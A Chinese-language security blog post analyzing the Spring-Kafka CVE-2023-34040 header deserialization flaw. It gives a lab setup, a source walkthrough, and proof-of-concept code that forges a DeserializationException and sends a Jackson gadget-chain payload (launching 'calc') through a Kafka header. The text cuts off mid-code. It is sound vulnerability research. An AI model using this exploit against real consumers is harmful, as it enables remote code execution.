@@ -1,0 +1,719 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="官方的描述：在受影响的版本，若存在不安全的配置，攻击者能够构造恶意的序列化对象，在反序列化记录头时触发。 漏洞条件：  用户没有配置ErrorHandlingDeserializer 用户显式设置checkDeserExWhenKeyNull和checkDeserExWhenValueNull为true 用户允许未受信任源往Kafka主题发布消息  攻击对象：  consumer  影响版本：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring-Kafka CVE-2023-34040">
+<meta property="og:url" content="http://example.com/2023/11/10/kafka/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="官方的描述：在受影响的版本，若存在不安全的配置，攻击者能够构造恶意的序列化对象，在反序列化记录头时触发。 漏洞条件：  用户没有配置ErrorHandlingDeserializer 用户显式设置checkDeserExWhenKeyNull和checkDeserExWhenValueNull为true 用户允许未受信任源往Kafka主题发布消息  攻击对象：  consumer  影响版本：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231110161019516.png">
+<meta property="og:image" content="http://example.com/img/image-20231110194422710.png">
+<meta property="og:image" content="http://example.com/img/image-20231110230602250.png">
+<meta property="og:image" content="http://example.com/img/image-20231110231848664.png">
+<meta property="og:image" content="http://example.com/img/image-20231110232231374.png">
+<meta property="og:image" content="http://example.com/img/image-20231110232421081.png">
+<meta property="og:image" content="http://example.com/img/image-20231110232815771.png">
+<meta property="og:image" content="http://example.com/img/image-20231110233747241.png">
+<meta property="og:image" content="http://example.com/img/image-20231110234454950.png">
+<meta property="og:image" content="http://example.com/img/image-20231110235842686.png">
+<meta property="article:published_time" content="2023-11-10T02:44:57.000Z">
+<meta property="article:modified_time" content="2023-11-15T14:59:21.770Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="middleware">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231110161019516.png">
+  
+  
+  
+  <title>Spring-Kafka CVE-2023-34040 - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Spring-Kafka CVE-2023-34040"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-10 10:44" pubdate>
+          2023年11月10日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          83 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Spring-Kafka CVE-2023-34040</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>官方的描述：在受影响的版本，若存在不安全的配置，攻击者能够构造恶意的序列化对象，在反序列化记录头时触发。</p>
+<p>漏洞条件：</p>
+<ul>
+<li>用户没有配置<code>ErrorHandlingDeserializer</code></li>
+<li>用户显式设置<code>checkDeserExWhenKeyNull</code>和<code>checkDeserExWhenValueNull</code>为<code>true</code></li>
+<li>用户允许未受信任源往Kafka主题发布消息</li>
+</ul>
+<p>攻击对象：</p>
+<ul>
+<li>consumer</li>
+</ul>
+<p>影响版本：</p>
+<ul>
+<li>Spring-Kafka<ul>
+<li>2.8.1 ~ 2.9.10</li>
+<li>3.0.0 ~ 3.0.9</li>
+</ul>
+</li>
+</ul>
+<h1 id="Kafka-Intro"><a href="#Kafka-Intro" class="headerlink" title="Kafka Intro"></a>Kafka Intro</h1><p>Kafka环境搭建，依赖于zookeeper</p>
+<p>如果不是在本机搭建，下面的<code>KAFKA_ADVERTISED_LISTENERS</code>改成自己的IP；本机搭建的话localhost就好了</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">zookeeper:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">confluentinc/cp-zookeeper:latest</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">ZOOKEEPER_CLIENT_PORT:</span> <span class="hljs-number">2181</span><br>      <span class="hljs-attr">ZOOKEEPER_TICK_TIME:</span> <span class="hljs-number">2000</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">22181</span><span class="hljs-string">:2181</span><br>  <br>  <span class="hljs-attr">kafka:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">confluentinc/cp-kafka:latest</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">zookeeper</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">29092</span><span class="hljs-string">:29092</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">KAFKA_BROKER_ID:</span> <span class="hljs-number">1</span><br>      <span class="hljs-attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="hljs-string">zookeeper:2181</span><br>      <span class="hljs-attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="hljs-string">PLAINTEXT://192.168.73.129:29092</span><br>      <span class="hljs-attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="hljs-string">PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT</span><br>      <span class="hljs-attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="hljs-string">PLAINTEXT</span><br>      <span class="hljs-attr">KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>客户端（生产者和消费者）跟着官方文档来，以2.9.10为例</p>
+<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-kafka/docs/2.9.10/reference/html/#getting-started">https://docs.spring.io/spring-kafka/docs/2.9.10/reference/html/#getting-started</a></p>
+<p>使用Spring Initializr快速构造项目，它会自动寻找与spring版本对应的spring-kafka版本</p>
+<p><img src="/./../img/image-20231110161019516.png" srcset="/img/loading.gif" lazyload alt="image-20231110161019516"></p>
+<p><code>Producer</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.producer;<br><br><span class="hljs-keyword">import</span> org.apache.kafka.clients.admin.NewTopic;<br><span class="hljs-keyword">import</span> org.springframework.boot.ApplicationRunner;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.kafka.config.TopicBuilder;<br><span class="hljs-keyword">import</span> org.springframework.kafka.core.KafkaTemplate;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(ProducerApplication.class, args);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> NewTopic <span class="hljs-title function_">topic</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> TopicBuilder.name(<span class="hljs-string">&quot;myTopic&quot;</span>)<br>                .partitions(<span class="hljs-number">10</span>)<br>                .replicas(<span class="hljs-number">1</span>)<br>                .build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ApplicationRunner <span class="hljs-title function_">runner</span><span class="hljs-params">(KafkaTemplate&lt;String, String&gt; template)</span> &#123;<br>        <span class="hljs-keyword">return</span> args -&gt; &#123;<br>            template.send(<span class="hljs-string">&quot;myTopic&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        &#125;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8080</span><br><span class="hljs-attr">spring.kafka.bootstrap-servers</span>=<span class="hljs-string">192.168.73.129:29092</span><br></code></pre></td></tr></table></figure>
+
+<p><code>Consumer</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.comsumer;<br><br><span class="hljs-keyword">import</span> org.apache.kafka.clients.admin.NewTopic;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.kafka.annotation.KafkaListener;<br><span class="hljs-keyword">import</span> org.springframework.kafka.config.TopicBuilder;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsumerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(ConsumerApplication.class, args);<br>    &#125;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> NewTopic <span class="hljs-title function_">topic</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> TopicBuilder.name(<span class="hljs-string">&quot;myTopic&quot;</span>)<br>            .partitions(<span class="hljs-number">10</span>)<br>            .replicas(<span class="hljs-number">1</span>)<br>            .build();<br>    &#125;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> KafkaProperties kafkaProperties;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; <span class="hljs-title function_">kafkaListenerContainerFactory</span><span class="hljs-params">()</span> &#123;<br>        Map&lt;String, Object&gt; props = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaProperties.getBootstrapServers());<br>        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);<br>        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);<br><br>        ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; factory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();<br>        factory.setConsumerFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultKafkaConsumerFactory</span>&lt;&gt;(props));<br>        factory.getContainerProperties().setCheckDeserExWhenKeyNull(<span class="hljs-literal">true</span>);<br>        factory.getContainerProperties().setCheckDeserExWhenValueNull(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br><br>    <span class="hljs-meta">@KafkaListener(id = &quot;myId&quot;, topics = &quot;myTopic&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(String in)</span> &#123;<br>        System.out.println(in);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8088</span><br><span class="hljs-attr">spring.kafka.consumer.auto-offset-reset</span>=<span class="hljs-string">earliest</span><br><span class="hljs-attr">spring.kafka.bootstrap-servers</span>=<span class="hljs-string">192.168.73.129:29092</span><br></code></pre></td></tr></table></figure>
+
+<p>启动生产者和消费者，消费者端成功接收到消息</p>
+<p><img src="/./../img/image-20231110194422710.png" srcset="/img/loading.gif" lazyload alt="image-20231110194422710"></p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>由官方文档可知，当设置<code>checkDeserExWhenKeyNull</code>和<code>checkDeserExWhenValueNull</code>为<code>true</code>，若接收到的消息<code>key</code>或<code>value</code>为空，会检查<code>DeserializationException</code>头部</p>
+<p><img src="/./../img/image-20231110230602250.png" srcset="/img/loading.gif" lazyload alt="image-20231110230602250"></p>
+<p><code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code></p>
+<p>从记录头里获取<code>KEY_DESERIALIZER_EXCEPTION_HEADER</code>（即这里的<code>springDeserializerExceptionKey</code>）对应的值，并尝试反序列化得到<code>DeserializationException</code>对象。</p>
+<p><img src="/./../img/image-20231110231848664.png" srcset="/img/loading.gif" lazyload alt="image-20231110231848664"></p>
+<p>调用栈往上走两步，这里判断记录的<code>key</code>或<code>value</code>是否为<code>null</code>，以及对应的<code>checkNullKeyForExceptions</code>或<code>checkNullValueForExceptions</code>是否开启</p>
+<p><img src="/./../img/image-20231110232231374.png" srcset="/img/loading.gif" lazyload alt="image-20231110232231374"></p>
+<p>可以发现我们用<code>MessageBuilder.withPayload</code>构造的消息只有value没有key</p>
+<p><img src="/./../img/image-20231110232421081.png" srcset="/img/loading.gif" lazyload alt="image-20231110232421081"></p>
+<p>进入<code>byteArrayToDeserializationException</code></p>
+<p><img src="/./../img/image-20231110232815771.png" srcset="/img/loading.gif" lazyload alt="image-20231110232815771"></p>
+<p>构造了一个<code>ObjectInputStream</code>对象来对记录头的值进行反序列化，重写了<code>resolveClass</code>方法</p>
+<p>反序列化的时候会判断首个类的类名是否为<code>org.springframework.kafka.support.serializer.DeserializationException</code></p>
+<p>第一次判断后<code>first</code>就被设为<code>false</code>了，也就是其内部嵌套的类就没有这个限制了。</p>
+<p>但是看一下这个<code>DeserializationException</code>的属性成员，发现没有可以被利用的类</p>
+<p><img src="/./../img/image-20231110233747241.png" srcset="/img/loading.gif" lazyload alt="image-20231110233747241"></p>
+<p>这里使用一个取巧的方法，直接在当前classpath下放上我们修改后的<code>DeserializationException</code>类，为不和项目依赖的类冲突，把包名的开头<code>org</code>修改为<code>xrg</code>，后面再把序列化得到数据中的包名改回来。</p>
+<p><img src="/./../img/image-20231110234454950.png" srcset="/img/loading.gif" lazyload alt="image-20231110234454950"></p>
+<p>但存在一个问题，修改原有类后会造成<code>serialVersionUID</code>的变化，反序列化时会检测这个值，若和接收方计算的不一致就会抛出异常。</p>
+<p>我们可以在修改后的类里把<code>serialVersionUID</code>写死了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.kafka.support.serializer.DeserializationException;<br><br><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.io.ObjectStreamClass&quot;</span>);<br>        Constructor&lt;?&gt; con = clazz.getDeclaredConstructor(Class.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ObjectStreamClass</span> <span class="hljs-variable">osc</span> <span class="hljs-operator">=</span> (ObjectStreamClass) con.newInstance(DeserializationException.class);<br>        System.out.println(osc.getSerialVersionUID());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xrg.springframework.kafka.support.serializer;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializationException</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">8280022391259546509L</span>;<br><br>    <span class="hljs-keyword">private</span> Object evil;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeserializationException</span><span class="hljs-params">(Object evil)</span> &#123;<br>        <span class="hljs-built_in">this</span>.evil = evil;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>既然是<code>spring-kafka</code>的应用，大概率配有<code>spring-boot-starter-web</code>依赖（别问为什么，因为官方提供的Demo也依赖了spring-web）</p>
+<p>那就打Spring-Web自带的Jackson利用链，参考网上师傅修改过后的稳定版本的链子。</p>
+<p>修改生产者的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> ApplicationRunner <span class="hljs-title function_">runner</span><span class="hljs-params">(KafkaTemplate&lt;Object, Object&gt; template)</span> &#123;<br>    <span class="hljs-keyword">return</span> args -&gt; &#123;<br>        ProducerRecord&lt;Object,Object&gt; producerRecord = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProducerRecord</span>&lt;&gt;(<span class="hljs-string">&quot;myTopic&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-literal">null</span>);<br>        producerRecord.headers().add(<span class="hljs-string">&quot;springDeserializerExceptionValue&quot;</span>, PayloadGeneration.getPayload(<span class="hljs-string">&quot;calc&quot;</span>));<br>        template.send(MessageBuilder<br>                      .withPayload(<span class="hljs-string">&quot;whatever&quot;</span>)<br>                      .setHeader(KafkaHeaders.TOPIC, <span class="hljs-string">&quot;myTopic&quot;</span>)<br>                      .setHeader(SerializationUtils.KEY_DESERIALIZER_EXCEPTION_HEADER, PayloadGeneration.getPayload(<span class="hljs-string">&quot;calc&quot;</span>)).build());<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 